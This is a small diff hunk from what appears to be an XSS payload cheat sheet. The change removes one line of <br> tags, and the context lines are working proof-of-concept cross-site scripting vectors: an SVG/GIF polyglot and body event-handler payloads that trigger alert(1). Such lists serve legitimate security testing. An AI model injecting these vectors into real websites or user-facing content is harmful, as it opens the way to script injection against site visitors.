@@ -98,7 +98,6 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
 <body onscroll=alert(1)><br><br><br><br>
 <br><br><br><br><br><br><br><br><br><br>
-<br><br><br><br><br><br><br><br><br><br>
 <br><br><br><br><br><br><x id=x>#x
 <body onresize=alert(1)>press F12!
 <body onhelp=alert(1)>press F1! (MSIE)
